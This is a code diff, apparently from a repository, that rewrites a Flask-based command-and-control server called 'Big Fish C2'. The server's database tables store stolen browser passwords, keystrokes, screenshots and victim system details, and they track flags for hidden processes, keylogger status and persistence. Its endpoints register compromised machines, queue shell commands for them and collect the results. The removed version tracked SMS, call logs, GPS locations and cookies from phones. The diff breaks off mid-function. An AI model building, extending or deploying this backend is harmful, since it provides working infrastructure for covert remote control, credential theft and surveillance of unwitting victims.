@@ -1,1691 +1,1435 @@
 #!/usr/bin/env python3
 """
-UNIVERSAL C2 SERVER - Cross-Platform Compatibility
-Works with: Windows, Linux, macOS, Android, iOS, Tablets
-Render.com compatible
+Advanced C2 Server - Big Fish System
+Features: Client monitoring, file upload/download, keylogging, password extraction
 """
 from flask import Flask, request, jsonify, send_file, Response
 from flask_cors import CORS
+from flask_socketio import SocketIO, emit
 import time
 import uuid
-import json
 import sqlite3
 import threading
 import os
 import hashlib
-import base64
 from datetime import datetime
+import base64
+import json
 import logging
-import mimetypes
-from typing import Dict, List, Optional
-import re
+from cryptography.fernet import Fernet
+import zipfile
+import io
 
-app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "*"}})
-
-# ============================================================================
-# CONFIGURATION
-# ============================================================================
-
-DATABASE = 'universal_c2.db'
-MEDIA_FOLDER = 'media'
-SCREENSHOTS_FOLDER = 'screenshots'
-KEYLOGS_FOLDER = 'keylogs'
-FILES_FOLDER = 'files'
-
-# Create directories
-for folder in [MEDIA_FOLDER, SCREENSHOTS_FOLDER, KEYLOGS_FOLDER, FILES_FOLDER]:
-    os.makedirs(folder, exist_ok=True)
-
-# Setup logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.StreamHandler(),
-        logging.FileHandler('server.log')
-    ]
-)
+# Configure logging
+logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-SERVER_START_TIME = time.time()
+app = Flask(__name__)
+CORS(app, origins="*")
+socketio = SocketIO(app, cors_allowed_origins="*")
 
-# ============================================================================
-# DATABASE SCHEMA
-# ============================================================================
+# Configuration
+DATABASE = 'bigfish.db'
+ONLINE_THRESHOLD = 300  # 5 minutes
+DOWNLOAD_FOLDER = 'downloads'
+UPLOAD_FOLDER = 'uploads'
+EXECUTABLES_FOLDER = 'executables'
+SCREENSHOTS_FOLDER = 'screenshots'
+KEYLOGS_FOLDER = 'keylogs'
+PASSWORDS_FOLDER = 'passwords'
+
+# Create folders
+for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, EXECUTABLES_FOLDER, 
+               SCREENSHOTS_FOLDER, KEYLOGS_FOLDER, PASSWORDS_FOLDER]:
+    os.makedirs(folder, exist_ok=True)
+
+# Encryption
+ENCRYPTION_KEY = Fernet.generate_key()
+cipher = Fernet(ENCRYPTION_KEY)
 
 def init_db():
-    """Initialize database with cross-platform schema"""
+    """Initialize database with all tables"""
     conn = sqlite3.connect(DATABASE)
-    cursor = conn.cursor()
+    c = conn.cursor()
     
-    # Devices table - Universal
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS devices (
-            device_id TEXT PRIMARY KEY,
-            device_name TEXT,
-            device_type TEXT,  -- phone, tablet, desktop, laptop
-            platform TEXT,     -- android, ios, windows, linux, macos
-            platform_version TEXT,
-            manufacturer TEXT,
-            model TEXT,
-            imei TEXT,
-            serial_number TEXT,
-            ip_address TEXT,
-            mac_address TEXT,
-            last_seen REAL,
-            first_seen REAL,
-            status TEXT DEFAULT 'offline',
-            battery_level INTEGER,
-            network_type TEXT,  -- wifi, cellular, ethernet
-            operator TEXT,
-            country_code TEXT,
-            language TEXT,
-            timezone TEXT,
-            root_access INTEGER DEFAULT 0,
-            screen_width INTEGER,
-            screen_height INTEGER,
-            storage_total INTEGER,
-            storage_free INTEGER,
-            ram_total INTEGER,
-            ram_free INTEGER,
-            cpu_cores INTEGER,
-            cpu_arch TEXT
-        )
-    ''')
-    
-    # Sessions table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS sessions (
-            session_id TEXT PRIMARY KEY,
-            device_id TEXT,
-            start_time REAL,
-            end_time REAL,
-            duration INTEGER,
-            data_sent INTEGER,
-            data_received INTEGER,
-            commands_executed INTEGER
-        )
-    ''')
+    # Clients table
+    c.execute("""CREATE TABLE IF NOT EXISTS clients (
+        id TEXT PRIMARY KEY,
+        hostname TEXT,
+        username TEXT,
+        os TEXT,
+        os_version TEXT,
+        arch TEXT,
+        cpu TEXT,
+        ram TEXT,
+        gpu TEXT,
+        ip TEXT,
+        last_seen REAL,
+        status TEXT,
+        privileges TEXT,
+        av_status TEXT,
+        country TEXT,
+        city TEXT,
+        isp TEXT,
+        process_hidden INTEGER DEFAULT 0,
+        keylogger_active INTEGER DEFAULT 0,
+        persistence_set INTEGER DEFAULT 0,
+        created_at REAL,
+        download_folder TEXT,
+        online_hours REAL DEFAULT 0
+    )""")
     
     # Commands table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS commands (
-            command_id TEXT PRIMARY KEY,
-            device_id TEXT,
-            command_type TEXT,  -- system, file, media, network, sms, etc.
-            command_text TEXT,
-            status TEXT DEFAULT 'pending',
-            result TEXT,
-            created_at REAL,
-            executed_at REAL,
-            requires_root INTEGER DEFAULT 0
-        )
-    ''')
+    c.execute("""CREATE TABLE IF NOT EXISTS commands (
+        id TEXT PRIMARY KEY,
+        client_id TEXT,
+        command TEXT,
+        command_type TEXT,
+        status TEXT,
+        output TEXT,
+        created_at REAL,
+        executed_at REAL,
+        priority INTEGER DEFAULT 5,
+        require_admin INTEGER DEFAULT 0,
+        encrypted INTEGER DEFAULT 0,
+        FOREIGN KEY (client_id) REFERENCES clients(id)
+    )""")
     
-    # Media files table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS media (
-            media_id TEXT PRIMARY KEY,
-            device_id TEXT,
-            file_type TEXT,  -- screenshot, photo, video, audio, document
-            file_path TEXT,
-            file_name TEXT,
-            file_size INTEGER,
-            mime_type TEXT,
-            thumbnail_path TEXT,
-            created_at REAL,
-            metadata TEXT  -- JSON with GPS, orientation, etc.
-        )
-    ''')
+    # Files table
+    c.execute("""CREATE TABLE IF NOT EXISTS files (
+        id TEXT PRIMARY KEY,
+        client_id TEXT,
+        filename TEXT,
+        original_name TEXT,
+        filepath TEXT,
+        filetype TEXT,
+        filesize INTEGER,
+        uploaded_at REAL,
+        downloaded INTEGER DEFAULT 0,
+        hash_md5 TEXT,
+        hash_sha256 TEXT,
+        encrypted INTEGER DEFAULT 0,
+        tags TEXT,
+        FOREIGN KEY (client_id) REFERENCES clients(id)
+    )""")
     
-    # SMS/Call logs table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS communications (
-            comm_id TEXT PRIMARY KEY,
-            device_id TEXT,
-            type TEXT,  -- sms, call, contact
-            phone_number TEXT,
-            contact_name TEXT,
-            content TEXT,
-            timestamp REAL,
-            direction TEXT,  -- incoming, outgoing, missed
-            duration INTEGER,
-            read_status INTEGER
-        )
-    ''')
-    
-    # Browser data table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS browser_data (
-            browser_id TEXT PRIMARY KEY,
-            device_id TEXT,
-            browser_name TEXT,
-            url TEXT,
-            title TEXT,
-            visit_count INTEGER,
-            last_visit REAL,
-            username TEXT,
-            password_hash TEXT,
-            cookie_data TEXT,
-            bookmark TEXT,
-            download_history TEXT
-        )
-    ''')
+    # Executables table
+    c.execute("""CREATE TABLE IF NOT EXISTS executables (
+        id TEXT PRIMARY KEY,
+        name TEXT,
+        description TEXT,
+        filename TEXT,
+        filepath TEXT,
+        platform TEXT,
+        require_admin INTEGER DEFAULT 0,
+        uploader TEXT,
+        uploaded_at REAL,
+        downloads INTEGER DEFAULT 0,
+        hash_sha256 TEXT,
+        size INTEGER
+    )""")
     
     # Keylogs table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS keylogs (
-            keylog_id TEXT PRIMARY KEY,
-            device_id TEXT,
-            application TEXT,
-            window_title TEXT,
-            keystrokes TEXT,
-            timestamp REAL,
-            screenshot_path TEXT
-        )
-    ''')
+    c.execute("""CREATE TABLE IF NOT EXISTS keylogs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        client_id TEXT,
+        keystrokes TEXT,
+        window_title TEXT,
+        timestamp REAL,
+        process_name TEXT,
+        encrypted INTEGER DEFAULT 1,
+        FOREIGN KEY (client_id) REFERENCES clients(id)
+    )""")
     
-    # Location data table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS locations (
-            location_id TEXT PRIMARY KEY,
-            device_id TEXT,
-            latitude REAL,
-            longitude REAL,
-            accuracy REAL,
-            altitude REAL,
-            speed REAL,
-            timestamp REAL,
-            provider TEXT,
-            address TEXT
-        )
-    ''')
+    # Screenshots table
+    c.execute("""CREATE TABLE IF NOT EXISTS screenshots (
+        id TEXT PRIMARY KEY,
+        client_id TEXT,
+        timestamp REAL,
+        filepath TEXT,
+        thumbnail_path TEXT,
+        width INTEGER,
+        height INTEGER,
+        size INTEGER,
+        FOREIGN KEY (client_id) REFERENCES clients(id)
+    )""")
     
-    # Application data table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS applications (
-            app_id TEXT PRIMARY KEY,
-            device_id TEXT,
-            package_name TEXT,
-            app_name TEXT,
-            version TEXT,
-            installed_date REAL,
-            last_updated REAL,
-            permissions TEXT,
-            data_path TEXT,
-            is_system_app INTEGER
-        )
-    ''')
+    # Passwords table
+    c.execute("""CREATE TABLE IF NOT EXISTS passwords (
+        id TEXT PRIMARY KEY,
+        client_id TEXT,
+        browser TEXT,
+        url TEXT,
+        username TEXT,
+        password TEXT,
+        encrypted_password TEXT,
+        timestamp REAL,
+        FOREIGN KEY (client_id) REFERENCES clients(id)
+    )""")
+    
+    # System info table
+    c.execute("""CREATE TABLE IF NOT EXISTS system_info (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        client_id TEXT,
+        info_type TEXT,
+        info_key TEXT,
+        info_value TEXT,
+        timestamp REAL,
+        FOREIGN KEY (client_id) REFERENCES clients(id)
+    )""")
+    
+    # Tasks table
+    c.execute("""CREATE TABLE IF NOT EXISTS tasks (
+        id TEXT PRIMARY KEY,
+        client_id TEXT,
+        task_type TEXT,
+        task_data TEXT,
+        status TEXT,
+        result TEXT,
+        created_at REAL,
+        completed_at REAL,
+        scheduled_for REAL,
+        priority INTEGER DEFAULT 5
+    )""")
+    
+    # Create indexes
+    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_files_client ON files(client_id)")
     
     conn.commit()
     conn.close()
-    logger.info("Universal database initialized")
+    logger.info("[✓] Database initialized")
+
+init_db()
 
 def get_db():
-    """Get database connection"""
     conn = sqlite3.connect(DATABASE)
     conn.row_factory = sqlite3.Row
     return conn
 
-# ============================================================================
-# DEVICE MANAGEMENT
-# ============================================================================
+def encrypt_data(data):
+    """Encrypt sensitive data"""
+    if isinstance(data, str):
+        data = data.encode()
+    return base64.b64encode(cipher.encrypt(data)).decode()
 
-@app.route('/api/v1/device/register', methods=['POST'])
-def device_register():
-    """Register a new device (any platform)"""
+def decrypt_data(encrypted_data):
+    """Decrypt data"""
+    return cipher.decrypt(base64.b64decode(encrypted_data)).decode()
+
+def get_client_folder(client_id, hostname):
+    """Get or create client-specific folder"""
+    safe_name = "".join(c for c in hostname if c.isalnum() or c in (' ', '-', '_')).strip()
+    if not safe_name:
+        safe_name = f"client_{client_id[:8]}"
+    
+    folders = {
+        'downloads': os.path.join(DOWNLOAD_FOLDER, safe_name),
+        'screenshots': os.path.join(SCREENSHOTS_FOLDER, safe_name),
+        'keylogs': os.path.join(KEYLOGS_FOLDER, safe_name),
+        'passwords': os.path.join(PASSWORDS_FOLDER, safe_name)
+    }
+    
+    for folder in folders.values():
+        os.makedirs(folder, exist_ok=True)
+    
+    return folders
+
+# ==================== ROUTES ====================
+
+@app.route('/')
+def index():
+    return jsonify({
+        'status': 'online',
+        'system': 'Big Fish C2',
+        'version': '4.0',
+        'clients': get_online_count()
+    })
+
+@app.route('/api/health')
+def health():
+    return jsonify({'status': 'healthy'})
+
+@app.route('/api/checkin', methods=['POST'])
+def client_checkin():
+    """Client checkin endpoint"""
     try:
         data = request.json
-        if not data:
-            return jsonify({'error': 'No data provided'}), 400
+        client_id = data.get('id')
         
-        device_id = data.get('device_id')
-        if not device_id:
-            return jsonify({'error': 'Missing device_id'}), 400
+        if not client_id:
+            return jsonify({'error': 'No client ID'}), 400
         
         conn = get_db()
-        cursor = conn.cursor()
-        
+        c = conn.cursor()
         current_time = time.time()
         
-        # Check if device exists
-        cursor.execute('SELECT * FROM devices WHERE device_id = ?', (device_id,))
-        existing = cursor.fetchone()
+        # Get client IP
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
-        device_info = {
-            'device_id': device_id,
-            'device_name': data.get('device_name', 'Unknown Device'),
-            'device_type': data.get('device_type', 'unknown'),
-            'platform': data.get('platform', 'unknown'),
-            'platform_version': data.get('platform_version', ''),
-            'manufacturer': data.get('manufacturer', ''),
-            'model': data.get('model', ''),
-            'imei': data.get('imei', ''),
-            'serial_number': data.get('serial_number', ''),
-            'ip_address': request.remote_addr,
-            'last_seen': current_time,
-            'status': 'online',
-            'battery_level': data.get('battery_level'),
-            'network_type': data.get('network_type'),
-            'operator': data.get('operator'),
-            'country_code': data.get('country_code'),
-            'language': data.get('language', 'en'),
-            'timezone': data.get('timezone'),
-            'root_access': data.get('root_access', 0),
-            'screen_width': data.get('screen_width'),
-            'screen_height': data.get('screen_height'),
-            'storage_total': data.get('storage_total'),
-            'storage_free': data.get('storage_free'),
-            'ram_total': data.get('ram_total'),
-            'ram_free': data.get('ram_free'),
-            'cpu_cores': data.get('cpu_cores'),
-            'cpu_arch': data.get('cpu_arch')
-        }
+        # Prepare client data
+        hostname = data.get('hostname', 'Unknown')
+        client_folders = get_client_folder(client_id, hostname)
         
-        if existing:
-            # Update existing device
-            update_fields = []
-            values = []
-            for key, value in device_info.items():
-                if key != 'device_id' and value is not None:
-                    update_fields.append(f"{key} = ?")
-                    values.append(value)
+        # Check if client exists
+        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
+        existing_client = c.fetchone()
+        
+        if existing_client:
+            # Update existing client
+            online_hours = existing_client['online_hours']
+            if existing_client['status'] == 'offline':
+                online_hours += (current_time - existing_client['last_seen']) / 3600
             
-            values.append(device_id)
-            query = f"UPDATE devices SET {', '.join(update_fields)} WHERE device_id = ?"
-            cursor.execute(query, values)
+            c.execute("""UPDATE clients SET 
+                hostname=?, username=?, os=?, os_version=?, arch=?,
+                cpu=?, ram=?, gpu=?, ip=?, last_seen=?,
+                status='online', privileges=?, av_status=?,
+                country=?, city=?, isp=?, download_folder=?, online_hours=?
+                WHERE id=?""",
+                (data.get('hostname'), data.get('username'),
+                 data.get('os'), data.get('os_version'),
+                 data.get('arch'), data.get('cpu'),
+                 data.get('ram'), data.get('gpu'),
+                 client_ip, current_time,
+                 data.get('privileges'), data.get('av_status'),
+                 data.get('country'), data.get('city'),
+                 data.get('isp'), client_folders['downloads'],
+                 online_hours, client_id))
         else:
-            # Insert new device
-            device_info['first_seen'] = current_time
-            
-            columns = ', '.join(device_info.keys())
-            placeholders = ', '.join(['?' for _ in device_info])
-            values = list(device_info.values())
-            
-            cursor.execute(f"INSERT INTO devices ({columns}) VALUES ({placeholders})", values)
+            # Insert new client
+            c.execute("""INSERT INTO clients VALUES 
+                (?,?,?,?,?,?,?,?,?,?,?,'online',?,?,?,?,?,?,?,?,?,?,?)""",
+                (client_id, data.get('hostname'), data.get('username'),
+                 data.get('os'), data.get('os_version'), data.get('arch'),
+                 data.get('cpu'), data.get('ram'), data.get('gpu'),
+                 client_ip, current_time, data.get('privileges'),
+                 data.get('av_status'), data.get('country'),
+                 data.get('city'), data.get('isp'), 0, 0, 0,
+                 current_time, client_folders['downloads'], 0))
         
-        # Create device-specific folders
-        device_folder = os.path.join(MEDIA_FOLDER, device_id[:8])
-        os.makedirs(device_folder, exist_ok=True)
-        
-        for subfolder in ['photos', 'videos', 'screenshots', 'documents', 'audio']:
-            os.makedirs(os.path.join(device_folder, subfolder), exist_ok=True)
+        # Store system info
+        if 'system_info' in data:
+            for key, value in data['system_info'].items():
+                c.execute("""INSERT INTO system_info (client_id, info_type, info_key, info_value, timestamp)
+                          VALUES (?, 'system', ?, ?, ?)""",
+                          (client_id, key, str(value), current_time))
         
         conn.commit()
         conn.close()
         
-        logger.info(f"Device registered: {device_id} ({device_info['platform']})")
+        # Notify via WebSocket
+        socketio.emit('client_update', {
+            'client_id': client_id,
+            'hostname': hostname,
+            'status': 'online',
+            'timestamp': current_time
+        })
+        
+        logger.info(f"[✓] Checkin: {hostname} ({client_ip})")
         
         return jsonify({
-            'status': 'success',
-            'device_id': device_id,
-            'server_time': current_time,
-            'message': 'Device registered successfully'
-        }), 200
+            'status': 'ok',
+            'timestamp': current_time,
+            'server_time': datetime.now().isoformat()
+        })
         
     except Exception as e:
-        logger.error(f"Device registration error: {e}")
+        logger.error(f"[✗] Checkin error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/v1/device/heartbeat', methods=['POST'])
-def device_heartbeat():
-    """Device heartbeat"""
+@app.route('/api/clients', methods=['GET'])
+def get_all_clients():
+    """Get all clients with detailed info"""
     try:
-        data = request.json
-        device_id = data.get('device_id')
-        
-        if not device_id:
-            return jsonify({'error': 'Missing device_id'}), 400
-        
         conn = get_db()
-        cursor = conn.cursor()
-        
+        c = conn.cursor()
         current_time = time.time()
         
-        # Update device status
-        cursor.execute('''
-            UPDATE devices 
-            SET last_seen = ?, status = 'online',
-                battery_level = COALESCE(?, battery_level),
-                network_type = COALESCE(?, network_type),
-                ip_address = ?
-            WHERE device_id = ?
-        ''', (
-            current_time,
-            data.get('battery_level'),
-            data.get('network_type'),
-            request.remote_addr,
-            device_id
-        ))
-        
-        conn.commit()
-        conn.close()
-        
-        return jsonify({'status': 'ok', 'timestamp': current_time}), 200
-        
-    except Exception as e:
-        logger.error(f"Heartbeat error: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/v1/devices', methods=['GET'])
-def get_devices():
-    """Get all registered devices"""
-    try:
-        device_type = request.args.get('type')
-        platform = request.args.get('platform')
-        
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        current_time = time.time()
-        
-        # Update status based on last_seen
-        cursor.execute('''
-            UPDATE devices 
-            SET status = CASE 
-                WHEN ? - last_seen > 300 THEN 'offline'
-                WHEN ? - last_seen > 60 THEN 'idle'
-                ELSE 'online'
-            END
-        ''', (current_time, current_time))
-        
+        # Update offline status
+        c.execute("UPDATE clients SET status='offline' WHERE ?-last_seen>?", 
+                 (current_time, ONLINE_THRESHOLD))
         conn.commit()
         
-        # Build query
-        query = '''
-            SELECT d.*,
-                   COUNT(DISTINCT c.command_id) as command_count,
-                   COUNT(DISTINCT m.media_id) as media_count
-            FROM devices d
-            LEFT JOIN commands c ON d.device_id = c.device_id
-            LEFT JOIN media m ON d.device_id = m.device_id
-            WHERE 1=1
-        '''
-        params = []
+        # Get all clients with stats
+        c.execute("""SELECT 
+            c.*,
+            COUNT(DISTINCT f.id) as total_files,
+            COUNT(DISTINCT s.id) as total_screenshots,
+            COUNT(DISTINCT k.id) as total_keylogs,
+            COUNT(DISTINCT p.id) as total_passwords,
+            COALESCE(MAX(s.timestamp), 0) as last_screenshot,
+            COALESCE(MAX(k.timestamp), 0) as last_keylog
+            FROM clients c
+            LEFT JOIN files f ON c.id = f.client_id
+            LEFT JOIN screenshots s ON c.id = s.client_id
+            LEFT JOIN keylogs k ON c.id = k.client_id
+            LEFT JOIN passwords p ON c.id = p.client_id
+            GROUP BY c.id
+            ORDER BY c.last_seen DESC""")
         
-        if device_type:
-            query += ' AND d.device_type = ?'
-            params.append(device_type)
-        
-        if platform:
-            query += ' AND d.platform = ?'
-            params.append(platform)
-        
-        query += ' GROUP BY d.device_id ORDER BY d.last_seen DESC'
-        
-        cursor.execute(query, params)
-        
-        devices = []
-        for row in cursor.fetchall():
+        clients = []
+        for row in c.fetchall():
             time_diff = current_time - row['last_seen']
             
-            # Determine status with emoji
+            # Determine status
             if time_diff < 60:
-                status_emoji = '🟢'
-                status_text = 'online'
+                status = 'online'
+                status_icon = '🟢'
             elif time_diff < 300:
-                status_emoji = '🟡'
-                status_text = 'idle'
+                status = 'idle'
+                status_icon = '🟡'
             else:
-                status_emoji = '🔴'
-                status_text = 'offline'
+                status = 'offline'
+                status_icon = '🔴'
             
-            # Platform icon
-            platform_icon = {
-                'android': '🤖',
-                'ios': '🍎',
-                'windows': '🪟',
-                'linux': '🐧',
-                'macos': '💻',
-                'phone': '📱',
-                'tablet': '📟'
-            }.get(row['platform'].lower(), '📱')
+            # Calculate uptime
+            uptime_str = ""
+            if row['online_hours'] > 0:
+                if row['online_hours'] < 1:
+                    uptime_str = f"{row['online_hours']*60:.0f}m"
+                elif row['online_hours'] < 24:
+                    uptime_str = f"{row['online_hours']:.1f}h"
+                else:
+                    uptime_str = f"{row['online_hours']/24:.1f}d"
             
-            devices.append({
-                'device_id': row['device_id'],
-                'device_name': row['device_name'],
-                'device_type': row['device_type'],
-                'platform': row['platform'],
-                'platform_icon': platform_icon,
-                'model': row['model'],
-                'status': row['status'],
-                'status_display': f"{status_emoji} {status_text}",
-                'battery_level': row['battery_level'],
-                'network_type': row['network_type'],
+            client_data = {
+                'id': row['id'],
+                'hostname': row['hostname'],
+                'username': row['username'],
+                'os': f"{row['os']} {row['os_version'] or ''}",
+                'arch': row['arch'],
+                'cpu': row['cpu'],
+                'ram': row['ram'],
+                'gpu': row['gpu'],
+                'ip': row['ip'],
+                'country': row['country'],
+                'city': row['city'],
+                'isp': row['isp'],
+                'privileges': row['privileges'],
+                'av_status': row['av_status'],
+                'status': status,
+                'status_icon': status_icon,
+                'process_hidden': bool(row['process_hidden']),
+                'keylogger_active': bool(row['keylogger_active']),
+                'persistence_set': bool(row['persistence_set']),
                 'last_seen': row['last_seen'],
-                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S'),
-                'command_count': row['command_count'] or 0,
-                'media_count': row['media_count'] or 0,
-                'ip_address': row['ip_address'],
-                'screen_resolution': f"{row['screen_width']}x{row['screen_height']}" if row['screen_width'] and row['screen_height'] else 'Unknown'
-            })
+                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%Y-%m-%d %H:%M:%S'),
+                'created_at': row['created_at'],
+                'created_str': datetime.fromtimestamp(row['created_at']).strftime('%Y-%m-%d'),
+                'online_hours': row['online_hours'],
+                'uptime_str': uptime_str,
+                'stats': {
+                    'files': row['total_files'],
+                    'screenshots': row['total_screenshots'],
+                    'keylogs': row['total_keylogs'],
+                    'passwords': row['total_passwords']
+                },
+                'last_activity': {
+                    'screenshot': row['last_screenshot'],
+                    'keylog': row['last_keylog']
+                }
+            }
+            clients.append(client_data)
+        
+        conn.close()
+        return jsonify({'clients': clients})
+        
+    except Exception as e:
+        logger.error(f"[✗] Get clients error: {e}")
+        return jsonify({'clients': []})
+
+@app.route('/api/client/<client_id>', methods=['GET'])
+def get_client_details(client_id):
+    """Get detailed information about a specific client"""
+    try:
+        conn = get_db()
+        c = conn.cursor()
+        
+        # Get client info
+        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
+        client = c.fetchone()
+        
+        if not client:
+            conn.close()
+            return jsonify({'error': 'Client not found'}), 404
+        
+        # Get recent commands
+        c.execute("""SELECT * FROM commands 
+                    WHERE client_id = ? 
+                    ORDER BY created_at DESC LIMIT 20""", (client_id,))
+        commands = [dict(row) for row in c.fetchall()]
+        
+        # Get system info
+        c.execute("""SELECT info_key, info_value FROM system_info 
+                    WHERE client_id = ? AND info_type = 'system'
+                    ORDER BY timestamp DESC""", (client_id,))
+        system_info = {row['info_key']: row['info_value'] for row in c.fetchall()}
+        
+        # Get file statistics
+        c.execute("""SELECT filetype, COUNT(*) as count, 
+                    SUM(filesize) as total_size 
+                    FROM files WHERE client_id = ? 
+                    GROUP BY filetype""", (client_id,))
+        file_stats = [dict(row) for row in c.fetchall()]
         
         conn.close()
         
         return jsonify({
-            'devices': devices,
-            'total': len(devices),
-            'online': len([d for d in devices if d['status'] == 'online'])
-        }), 200
+            'client': dict(client),
+            'commands': commands,
+            'system_info': system_info,
+            'file_stats': file_stats
+        })
         
     except Exception as e:
-        logger.error(f"Get devices error: {e}")
-        return jsonify({'devices': [], 'error': str(e)}), 500
+        logger.error(f"[✗] Client details error: {e}")
+        return jsonify({'error': str(e)}), 500
 
-# ============================================================================
-# COMMAND SYSTEM
-# ============================================================================
-
-@app.route('/api/v1/command/send', methods=['POST'])
+@app.route('/api/command', methods=['POST'])
 def send_command():
-    """Send command to device"""
+    """Send command to client"""
     try:
         data = request.json
-        device_id = data.get('device_id')
+        client_id = data.get('client_id')
         command = data.get('command')
-        command_type = data.get('command_type', 'system')
+        command_type = data.get('type', 'shell')
+        require_admin = data.get('require_admin', False)
+        priority = data.get('priority', 5)
         
-        if not device_id or not command:
-            return jsonify({'error': 'Missing device_id or command'}), 400
+        if not client_id or not command:
+            return jsonify({'error': 'Missing parameters'}), 400
         
         conn = get_db()
-        cursor = conn.cursor()
+        c = conn.cursor()
         
-        # Check if device exists
-        cursor.execute('SELECT status FROM devices WHERE device_id = ?', (device_id,))
-        device = cursor.fetchone()
-        
-        if not device:
+        # Check if client exists
+        c.execute('SELECT id FROM clients WHERE id = ?', (client_id,))
+        if not c.fetchone():
             conn.close()
-            return jsonify({'error': 'Device not found'}), 404
+            return jsonify({'error': 'Client not found'}), 404
         
-        # Create command record
-        command_id = str(uuid.uuid4())
-        
-        cursor.execute('''
-            INSERT INTO commands 
-            (command_id, device_id, command_type, command_text, status, created_at)
-            VALUES (?, ?, ?, ?, 'pending', ?)
-        ''', (command_id, device_id, command_type, command, time.time()))
+        # Create command
+        cmd_id = str(uuid.uuid4())
+        c.execute("""INSERT INTO commands 
+                    (id, client_id, command, command_type, status, 
+                     created_at, priority, require_admin)
+                    VALUES (?, ?, ?, ?, 'pending', ?, ?, ?)""",
+                 (cmd_id, client_id, command, command_type, 
+                  time.time(), priority, 1 if require_admin else 0))
         
         conn.commit()
         conn.close()
         
-        logger.info(f"Command sent: {command_id[:8]} -> {device_id[:8]}: {command[:50]}")
+        logger.info(f"[✓] Command sent: {command_type} to {client_id[:8]}")
         
         return jsonify({
             'success': True,
-            'command_id': command_id,
+            'command_id': cmd_id,
             'message': 'Command queued'
-        }), 200
+        })
         
     except Exception as e:
-        logger.error(f"Command send error: {e}")
+        logger.error(f"[✗] Send command error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/v1/commands/<device_id>', methods=['GET'])
-def get_commands(device_id):
-    """Get pending commands for device"""
+@app.route('/api/commands/<client_id>', methods=['GET'])
+def get_pending_commands(client_id):
+    """Get pending commands for client"""
     try:
         conn = get_db()
-        cursor = conn.cursor()
+        c = conn.cursor()
+        current_time = time.time()
         
-        # Update device last seen
-        cursor.execute('UPDATE devices SET last_seen = ? WHERE device_id = ?', 
-                      (time.time(), device_id))
+        # Update last seen
+        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
+                 (current_time, client_id))
         
         # Get pending commands
-        cursor.execute('''
-            SELECT command_id, command_type, command_text, created_at 
-            FROM commands 
-            WHERE device_id = ? AND status = 'pending'
-            ORDER BY created_at ASC
-            LIMIT 20
-        ''', (device_id,))
+        c.execute("""SELECT id, command, command_type, require_admin 
+                    FROM commands 
+                    WHERE client_id = ? AND status = 'pending'
+                    ORDER BY priority DESC, created_at ASC
+                    LIMIT 10""", (client_id,))
         
-        commands = []
-        for row in cursor.fetchall():
-            commands.append({
-                'command_id': row['command_id'],
-                'command_type': row['command_type'],
-                'command': row['command_text'],
-                'created_at': row['created_at'],
-                'age': time.time() - row['created_at']
-            })
+        commands = [{'id': row['id'], 'command': row['command'],
+                    'type': row['command_type'], 
+                    'require_admin': bool(row['require_admin'])} 
+                   for row in c.fetchall()]
         
-        # Mark as sent
         if commands:
-            cmd_ids = [cmd['command_id'] for cmd in commands]
-            placeholders = ','.join(['?' for _ in cmd_ids])
-            cursor.execute(f'''
-                UPDATE commands SET status = 'sent'
-                WHERE command_id IN ({placeholders})
-            ''', cmd_ids)
+            # Mark as sent
+            cmd_ids = [cmd['id'] for cmd in commands]
+            placeholders = ','.join(['?'] * len(cmd_ids))
+            c.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", cmd_ids)
         
         conn.commit()
         conn.close()
         
-        return jsonify({'commands': commands}), 200
+        return jsonify({'commands': commands})
         
     except Exception as e:
-        logger.error(f"Get commands error: {e}")
-        return jsonify({'commands': []}), 500
+        logger.error(f"[✗] Get commands error: {e}")
+        return jsonify({'commands': []})
 
-@app.route('/api/v1/command/result', methods=['POST'])
-def submit_result():
-    """Submit command result"""
+@app.route('/api/command/result', methods=['POST'])
+def submit_command_result():
+    """Submit command execution result"""
     try:
         data = request.json
         command_id = data.get('command_id')
-        result = data.get('result', '')
+        output = data.get('output', '')
         status = data.get('status', 'completed')
         
         if not command_id:
-            return jsonify({'error': 'Missing command_id'}), 400
+            return jsonify({'error': 'Missing command ID'}), 400
         
         conn = get_db()
-        cursor = conn.cursor()
+        c = conn.cursor()
         
-        # Update command record
-        cursor.execute('''
-            UPDATE commands 
-            SET status = ?, result = ?, executed_at = ?
-            WHERE command_id = ?
-        ''', (status, result, time.time(), command_id))
+        c.execute("""UPDATE commands 
+                    SET status = ?, output = ?, executed_at = ?
+                    WHERE id = ?""",
+                 (status, output, time.time(), command_id))
+        
+        # Get client ID from command
+        c.execute("SELECT client_id FROM commands WHERE id = ?", (command_id,))
+        result = c.fetchone()
         
         conn.commit()
         conn.close()
         
-        logger.info(f"Command result: {command_id[:8]} -> {status}")
